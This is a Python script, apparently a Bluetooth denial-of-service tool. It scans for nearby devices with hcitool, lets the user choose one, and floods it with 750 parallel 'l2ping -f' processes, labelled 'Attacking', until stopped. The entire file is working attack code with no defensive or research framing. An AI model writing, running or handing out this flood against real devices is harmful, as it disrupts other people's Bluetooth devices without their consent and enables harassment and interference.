from os import getuid, kill
from subprocess import check_output, Popen, DEVNULL
from time import sleep


def confirm(question):
    try:
        while 1:
            reply = input(f"{question}: ").lower()[:1]
            if reply in 'yosjtdд':  # (international), using {in} to consider enter too
                return 1
            elif reply == 'n':
                return 0
    except (KeyboardInterrupt, EOFError):
        bye()


def bye():
    print("\nBye!")
    sleep(1)
    print('\033c')
    exit(0)


def get_devices():
    if not len(check_output(['hcitool', 'dev'])[9:]):
        exit("Enable Bluetooth first")
    print("\033cScanning...\n")
    hcitool_out = check_output(['hcitool', 'scan']).decode()[13:-1]
    devices = [i.split('\t')[1:] for i in hcitool_out.split('\n') if len(hcitool_out) != 0]
    return devices


def attack(target):
    from signal import SIGTERM
    print(f"\033c\nTrying on '{target[1]}', please wait...")
    pids = [Popen(['l2ping', '-f', '-s', '660', target[0]], stdout=DEVNULL).pid for i in range(750)]
    try:
        input(f"\033c\nAttacking '{target[1]}', press enter to stop... ")
    finally:
        list(map(lambda pid: kill(pid, SIGTERM), pids))
        bye()


def main():
    devices = get_devices()
    dev_number = len(devices)
    if not dev_number:
        if not confirm("No devices around :(\nScan again?"):
            bye()
        main()
    elif dev_number == 1:
        attack(devices[0])
    else:
        print("\033c\nSeveral devices found:\n")
        for index, device in enumerate(devices):
            print(f"{index}) '{device[1]}'\t<{device[0]}>")
        while 1:
            try:
                target_i = int(input(f"\nSelect a device (0-{dev_number - 1}): "))
                if target_i in range(dev_number):
                    break
            except ValueError:
                continue
            except (KeyboardInterrupt, EOFError):
                bye()
        attack(devices[target_i])


if __name__ == '__main__':
    if not getuid():  # check for root launch
        main()
    else:
        exit("Run it as root")
